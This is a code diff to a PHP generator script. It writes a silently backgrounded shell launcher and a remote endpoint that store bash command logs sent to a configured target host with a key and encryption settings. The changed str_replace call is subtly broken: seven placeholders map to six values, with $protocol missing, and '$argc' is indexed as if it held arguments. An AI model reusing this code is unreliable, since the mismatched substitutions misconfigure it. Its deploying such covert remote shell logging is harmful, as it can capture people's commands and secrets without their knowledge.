@@ -35,7 +35,7 @@ if (!is_dir("$out/target")) {
     mkdir("$out/target");
 } else {
     foreach (array_diff(scandir("$out/target"), ['.', '..']) as $file) {
-        unlink("$out/source/$file");
+        unlink("$out/target/$file");
     }
 }
 if (!is_dir("$out/home")) {
@@ -71,20 +71,25 @@ file_put_contents(
 );
 file_put_contents(
     "$out/source/$logger.sh",
-    "TARGET_API=$api "
-    . "TARGET_PROTOCOL=$protocol "
-    . "TARGET_HOST=$target "
-    . "TARGET_KEY=$key "
-    . "LOCAL_CRYPT=$crypt "
-    . "LOCAL_IV=$iv "
-    . "LOCAL_CRYPT=$crypt "
-    . "php $logger.php &>/dev/null &"
+    str_replace(
+        [
+            '###TARGET_API###',
+            '###TARGET_PROTOCOL###',
+            '###TARGET_HOST###',
+            '###TARGET_KEY###',
+            '###LOCAL_CRYPT###',
+            '###LOCAL_IV###',
+            '###LOCAL_PASS###',
+        ],
+        [$api, $target, $key, $crypt, $iv, $pass],
+        file_get_contents("$in/start.sh")
+    )
 );
 file_put_contents(
     "$out/target/$api.php",
     str_replace(
         ['##SOURCE_HOST##', '##SOURCE_KEY##', '##TARGET_FILTER##', '##DATABASE_CONNECTION##'],
-        [$source, $key, $argc[5] ?? 'false', ($argc[4] ?? 'sqlite:/var/log/remote_bash_log.sqlite')],
+        [$source, $key, $argc[5] ?? 'false', ($argc[4] ?? 'sqlite:/tmp/remote_bash_log.sqlite')],
         file_get_contents("$in/api.php")
     )
 );
